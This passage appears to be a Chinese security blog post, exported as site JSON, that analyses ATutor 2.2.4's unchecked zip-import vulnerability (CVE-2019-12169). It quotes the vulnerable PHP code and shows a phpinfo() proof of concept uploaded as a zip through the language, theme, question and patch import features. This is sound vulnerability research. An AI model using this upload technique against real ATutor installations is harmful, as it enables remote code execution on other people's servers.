library不仅能够压缩与解压缩Zip格式的文件；还能解压缩文档中的内容，同时也可以对现有的ZIP包进行添加或删除文件。\n\n我们接下来看下import方法中是如何使用PclZip，见下图\n\n![bef56d465f0158a156524a4d431262e2.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170944-569374b0-860b-1.png)\n\n程序创建了上传的zip压缩包的一个PclZip对象进行操作与控制，在解压过程中使用了extract方法。该方法中第一个参数是设置项，第二个是对应设置项的值\n\n我们来看下PCLZIP_OPT_PATH设置项的作用\n\n![6bf20e6b27427f39a0b6d536daa372e8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171002-61af3a0a-860b-1.png)\n\n可见，PCLZIP_OPT_PATH设置项指定我们上传的zip文件解压目录为\\$import_path参数对应的路径\n\n解压成功后，poc.zip中内容出现在对应文件夹中\n\n![dbfe063613c36620cdfc66cc3665443d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171017-6a7f415c-860b-1.png)\n\n查看poc.php中的值，可以发现poc上传成功\n\n![64cc162245f48311e259db798bb674a4.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171031-72c2b25e-860b-1.png)\n\n访问如下地址，触发poc\n\n![5da715061c21b6f94f2365b838a1a8bc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171047-7c27e9b8-860b-1.png)\n\n除此之外，该应用几乎所有import接口，在后台都采用PclZip将上传的zip解压到对应目录中。然而这些操作无一例外的未对压缩包中的文件进行校验。下面举几个例子：\n\n位于mods/_core/themes/import.php文件中的主题导入功能,代码如下:\n\n```php\n/**\n* Imports a theme from a URL or Zip file to Atutor\n* @access  private\n* @author  Shozub Qureshi\n*/\nfunction import_theme() {\n\tglobal $db;\n\tglobal $msg;\n\t\n\tif (isset($_POST['url']) && ($_POST['url'] != 'http://') ) {\n\t\tif ($content = @file_get_contents($_POST['url'])) {\n    \n\t⋮\n        \n\t// unzip file and save into directory in themes\n\t$archive = new PclZip($_FILES['file']['tmp_name']);\n    \n\t//extract contents to importpath/foldrname\n\tif (!$archive->extract($import_path)) {\n\t\t$errors = array('IMPORT_ERROR_IN_ZIP', $archive->errorInfo(true));\n\t\tclr_dir($import_path);\n\t\t$msg->addError($errors);\n\t\theader('Location: index.php'); \n\t\texit;\n\t}\n```\n\n可以发现这里也使用了extract方法将上传文件进行解压\n\n来看一下导入主题功能对应的前端页面\n\n![118a2873749d6200f96edfa1790637c9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171145-9ea9e234-860b-1.png)\n\n这里页面与导入语音包的页面极其相似，只不过最终解压后存放的路径不同，不再是content/import/，而是themes/\n\n在此处上传构造好的poc.zip，最终poc.php将会被解压到themes文件夹中\n\n![25a945cf7202608265fdab6909a4e825.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171205-aac48c54-860b-1.png)\n\n位于/mods/_standard/tests/question_import.php文件的问题导入功能\n\n![54cecd39032e9d1de591ef8498bd8c04.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171225-b6d6cbd8-860b-1.png)\n\n位于mods/_standard/patcher/index_admin.php文件的补丁导入功能\n\n![1962fed0465d4cdf835a3274e8065876.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171245-c280f6de-860b-1.png)\n\n这些功能无一例外的存在着相似的漏洞\n\n总结\n----\n\n针对单一文件上传，大多数Web应用都会进行严格的文件类型检测，但是涉及到压缩包上传，很多应用都不会检测压缩包中的内容，直接将压缩包中内容解压到对应目录中，这样就会导致了这类漏洞的产生。","slug":"ATutor-CVE-2019-12169","published":1,"updated":"2020-10-27T09:25:29.203Z","_id":"ckgrozu820007wsa9d3ubgi2r","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"漏洞介绍\"><a href=\"#漏洞介绍\" class=\"headerlink\" title=\"漏洞介绍\"></a>漏洞介绍</h2><p>ATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS），该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、 Moddle及Sakai号称为四大开源课程管理系统。</p>\n<p>ATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)，攻击者可利用该漏洞进行远程代码执行攻击。</p>\n<p>经过分析发现，除了CVE-2019-1216所报道的语言导入功能外，ATutor在其他功能模块中也大量存在着相似的漏洞，本文会在后面针对这一点进行介绍。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>据漏洞披露可知，漏洞触发点存在于mods/_core/languages/language_import.php文件中</p>\n<p>首先跟入language_import.php文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/****************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/* ATutor                                         */</span></span><br><span class=\"line\"><span class=\"comment\">/****************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/* Copyright (c) 2002-2010                                      */</span></span><br><span class=\"line\"><span class=\"comment\">/* Inclusive Design Institute                                   */</span></span><br><span class=\"line\"><span class=\"comment\">/* http://atutor.ca                                     */</span></span><br><span class=\"line\"><span class=\"comment\">/*                                                              */</span></span><br><span class=\"line\"><span class=\"comment\">/* This program is free software. You can redistribute it and/or*/</span></span><br><span class=\"line\"><span class=\"comment\">/* modify it under the terms of the GNU General Public License  */</span></span><br><span class=\"line\"><span class=\"comment\">/* as published by the Free Software Foundation.            */</span></span><br><span class=\"line\"><span class=\"comment\">/****************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">// $Id$</span></span><br><span class=\"line\"></span><br><span class=\"line\">define(<span class=\"string\">&#x27;AT_INCLUDE_PATH&#x27;</span>, <span class=\"string\">&#x27;../../../include/&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">require</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;vitals.inc.php&#x27;</span>);</span><br><span class=\"line\">admin_authenticate(AT_ADMIN_PRIV_LANGUAGES);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;classes/pclzip.lib.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;../mods/_core/languages/classes/LanguageEditor.class.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;../mods/_core/languages/classes/LanguagesParser.class.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* to avoid timing out on large files */</span></span><br><span class=\"line\">@set_time_limit(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$_SESSION[<span class=\"string\">&#x27;done&#x27;</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;submit_import&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;../mods/_core/languages/classes/RemoteLanguageManager.class.php&#x27;</span>);</span><br><span class=\"line\">    $remoteLanguageManager = <span class=\"keyword\">new</span> RemoteLanguageManager();</span><br><span class=\"line\">    $language_code = explode(<span class=\"string\">&quot;_&quot;</span>,$_POST[<span class=\"string\">&#x27;language&#x27;</span>]);</span><br><span class=\"line\">    $remoteLanguageManager-&gt;import($_POST[<span class=\"string\">&#x27;language&#x27;</span>]);</span><br><span class=\"line\">    header(<span class=\"string\">&#x27;Location: language_import.php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;submit&#x27;</span>]) &amp;&amp; (!is_uploaded_file($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>]) || !$_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;size&#x27;</span>])) &#123;</span><br><span class=\"line\">    $msg-&gt;addError(<span class=\"string\">&#x27;LANG_IMPORT_FAILED&#x27;</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;submit&#x27;</span>]) &amp;&amp; !$_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]) &#123;</span><br><span class=\"line\">    $msg-&gt;addError(<span class=\"string\">&#x27;IMPORTFILE_EMPTY&#x27;</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;submit&#x27;</span>]) &amp;&amp; is_uploaded_file($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class=\"line\">    $languageManager-&gt;import($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>]);</span><br><span class=\"line\">    header(<span class=\"string\">&#x27;Location: ./language_import.php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从language_import.php文件中35行起，可以发现文件上传相关代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170655-f1f7f882-860a-1.png\" alt=\"f1d2c8415c4c633298881ab7bf76d404.png\"></p>\n<p>从上图红框中代码可知，此处代码块是对文件上传情况进行校验</p>\n<p>在文件成功上传后，进入下一个if分支</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170715-fdb0bcea-860a-1.png\" alt=\"1121c09a5fd3ee682fdc0f35913ee33d.png\"></p>\n<p>在这个分支里，程序将调用$languageManager-&gt;import方法对文件进行处理</p>\n<p>继续跟入import方法，位于/mods/_core/languages/classes/LanguageManager.class.php文件中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// public</span></span><br><span class=\"line\"><span class=\"comment\">// import language pack from specified file</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">import</span>(<span class=\"params\">$filename</span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $languageManager, $msg;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>], <span class=\"string\">&#x27;master&#x27;</span>))&#123;</span><br><span class=\"line\">        <span class=\"comment\">// hack to create path to subdir for imported github language packs</span></span><br><span class=\"line\">        $import_dir = str_replace(<span class=\"string\">&quot;.zip&quot;</span>, <span class=\"string\">&quot;&quot;</span>, $_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]).<span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;language&#x27;</span>]))&#123;</span><br><span class=\"line\">        $import_dir = $_POST[<span class=\"string\">&#x27;language&#x27;</span>].<span class=\"string\">&#x27;-master/&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;classes/pclzip.lib.php&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;../mods/_core/languages/classes/LanguagesParser.class.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t$import_path = AT_CONTENT_DIR . <span class=\"string\">&#x27;import/&#x27;</span>;</span><br><span class=\"line\">\t$import_path_tmp = $import_path.$import_dir;</span><br><span class=\"line\">\t$language_xml = @file_get_contents($import_path.<span class=\"string\">&#x27;language.xml&#x27;</span>);</span><br><span class=\"line\">\t$archive = <span class=\"keyword\">new</span> PclZip($filename);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ($archive-&gt;extract(\tPCLZIP_OPT_PATH,\t$import_path) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;Error : &#x27;</span> . $archive-&gt;errorInfo(<span class=\"literal\">true</span>));</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>在import方法中程序调用PclZip对压缩包进行处理</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$archive = <span class=\"keyword\">new</span> PclZip($filename);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($archive-&gt;extract(\tPCLZIP_OPT_PATH,\t$import_path) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;Error : &#x27;</span> . $archive-&gt;errorInfo(<span class=\"literal\">true</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为了更好的理解import方法的执行流程，我们将会进行动态调试。首先构造一个poc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>将这个poc.php打包为poc.zip</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170822-25b697e6-860b-1.png\" alt=\"0a70cb1152c4da8afdb860bb66d642d9.png\"></p>\n<p>访问如下链接以进入上传页面</p>\n<p><a href=\"http://target/ATutor/mods/_core/languages/language_import.php\">http://target/ATutor/mods/_core/languages/language_import.php</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170852-37944eea-860b-1.png\" alt=\"5a822f926e62f0615ed92126333ba784.png\"></p>\n<p>在上传语言包页面中选择构造好的poc.zip并点击import按钮上传。当请求发送给后台服务器，程序执行到下图断点处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170925-4b189bba-860b-1.png\" alt=\"ed87891f5ab9fc8afbf586cb8eade5ed.png\"></p>\n<p>此时的$import_path值为atutor应用的/content/import路径：”content/import/”，程序调用PclZip的extract方法对压缩包进行解压。接下来我们介绍以下PclZip类</p>\n<h3 id=\"PclZip\"><a href=\"#PclZip\" class=\"headerlink\" title=\"PclZip\"></a>PclZip</h3><p>PclZip是一个强大的压缩与解压缩zip文件的PHP类，PclZip library不仅能够压缩与解压缩Zip格式的文件；还能解压缩文档中的内容，同时也可以对现有的ZIP包进行添加或删除文件。</p>\n<p>我们接下来看下import方法中是如何使用PclZip，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170944-569374b0-860b-1.png\" alt=\"bef56d465f0158a156524a4d431262e2.png\"></p>\n<p>程序创建了上传的zip压缩包的一个PclZip对象进行操作与控制，在解压过程中使用了extract方法。该方法中第一个参数是设置项，第二个是对应设置项的值</p>\n<p>我们来看下PCLZIP_OPT_PATH设置项的作用</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171002-61af3a0a-860b-1.png\" alt=\"6bf20e6b27427f39a0b6d536daa372e8.png\"></p>\n<p>可见，PCLZIP_OPT_PATH设置项指定我们上传的zip文件解压目录为$import_path参数对应的路径</p>\n<p>解压成功后，poc.zip中内容出现在对应文件夹中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171017-6a7f415c-860b-1.png\" alt=\"dbfe063613c36620cdfc66cc3665443d.png\"></p>\n<p>查看poc.php中的值，可以发现poc上传成功</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171031-72c2b25e-860b-1.png\" alt=\"64cc162245f48311e259db798bb674a4.png\"></p>\n<p>访问如下地址，触发poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171047-7c27e9b8-860b-1.png\" alt=\"5da715061c21b6f94f2365b838a1a8bc.png\"></p>\n<p>除此之外，该应用几乎所有import接口，在后台都采用PclZip将上传的zip解压到对应目录中。然而这些操作无一例外的未对压缩包中的文件进行校验。下面举几个例子：</p>\n<p>位于mods/_core/themes/import.php文件中的主题导入功能,代码如下:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* Imports a theme from a URL or Zip file to Atutor</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@access</span>  private</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@author</span>  Shozub Qureshi</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">import_theme</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $db;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $msg;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;url&#x27;</span>]) &amp;&amp; ($_POST[<span class=\"string\">&#x27;url&#x27;</span>] != <span class=\"string\">&#x27;http://&#x27;</span>) ) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ($content = @file_get_contents($_POST[<span class=\"string\">&#x27;url&#x27;</span>])) &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">\t⋮</span><br><span class=\"line\">        </span><br><span class=\"line\">\t<span class=\"comment\">// unzip file and save into directory in themes</span></span><br><span class=\"line\">\t$archive = <span class=\"keyword\">new</span> PclZip($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>]);</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"comment\">//extract contents to importpath/foldrname</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!$archive-&gt;extract($import_path)) &#123;</span><br><span class=\"line\">\t\t$errors = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;IMPORT_ERROR_IN_ZIP&#x27;</span>, $archive-&gt;errorInfo(<span class=\"literal\">true</span>));</span><br><span class=\"line\">\t\tclr_dir($import_path);</span><br><span class=\"line\">\t\t$msg-&gt;addError($errors);</span><br><span class=\"line\">\t\theader(<span class=\"string\">&#x27;Location: index.php&#x27;</span>); </span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以发现这里也使用了extract方法将上传文件进行解压</p>\n<p>来看一下导入主题功能对应的前端页面</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171145-9ea9e234-860b-1.png\" alt=\"118a2873749d6200f96edfa1790637c9.png\"></p>\n<p>这里页面与导入语音包的页面极其相似，只不过最终解压后存放的路径不同，不再是content/import/，而是themes/</p>\n<p>在此处上传构造好的poc.zip，最终poc.php将会被解压到themes文件夹中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171205-aac48c54-860b-1.png\" alt=\"25a945cf7202608265fdab6909a4e825.png\"></p>\n<p>位于/mods/_standard/tests/question_import.php文件的问题导入功能</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171225-b6d6cbd8-860b-1.png\" alt=\"54cecd39032e9d1de591ef8498bd8c04.png\"></p>\n<p>位于mods/_standard/patcher/index_admin.php文件的补丁导入功能</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171245-c280f6de-860b-1.png\" alt=\"1962fed0465d4cdf835a3274e8065876.png\"></p>\n<p>这些功能无一例外的存在着相似的漏洞</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>针对单一文件上传，大多数Web应用都会进行严格的文件类型检测，但是涉及到压缩包上传，很多应用都不会检测压缩包中的内容，直接将压缩包中内容解压到对应目录中，这样就会导致了这类漏洞的产生。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"漏洞介绍\"><a href=\"#漏洞介绍\" class=\"headerlink\" title=\"漏洞介绍\"></a>漏洞介绍</h2><p>ATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS），该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、 Moddle及Sakai号称为四大开源课程管理系统。</p>\n<p>ATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)，攻击者可利用该漏洞进行远程代码执行攻击。</p>\n<p>经过分析发现，除了CVE-2019-1216所报道的语言导入功能外，ATutor在其他功能模块中也大量存在着相似的漏洞，本文会在后面针对这一点进行介绍。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>据漏洞披露可知，漏洞触发点存在于mods/_core/languages/language_import.php文件中</p>\n<p>首先跟入language_import.php文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/****************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/* ATutor                                         */</span></span><br><span class=\"line\"><span class=\"comment\">/****************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/* Copyright (c) 2002-2010                                      */</span></span><br><span class=\"line\"><span class=\"comment\">/* Inclusive Design Institute                                   */</span></span><br><span class=\"line\"><span class=\"comment\">/* http://atutor.ca                                     */</span></span><br><span class=\"line\"><span class=\"comment\">/*                                                              */</span></span><br><span class=\"line\"><span class=\"comment\">/* This program is free software. You can redistribute it and/or*/</span></span><br><span class=\"line\"><span class=\"comment\">/* modify it under the terms of the GNU General Public License  */</span></span><br><span class=\"line\"><span class=\"comment\">/* as published by the Free Software Foundation.            */</span></span><br><span class=\"line\"><span class=\"comment\">/****************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">// $Id$</span></span><br><span class=\"line\"></span><br><span class=\"line\">define(<span class=\"string\">&#x27;AT_INCLUDE_PATH&#x27;</span>, <span class=\"string\">&#x27;../../../include/&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">require</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;vitals.inc.php&#x27;</span>);</span><br><span class=\"line\">admin_authenticate(AT_ADMIN_PRIV_LANGUAGES);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;classes/pclzip.lib.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;../mods/_core/languages/classes/LanguageEditor.class.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;../mods/_core/languages/classes/LanguagesParser.class.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* to avoid timing out on large files */</span></span><br><span class=\"line\">@set_time_limit(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$_SESSION[<span class=\"string\">&#x27;done&#x27;</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;submit_import&#x27;</span>]))&#123;</span><br><span 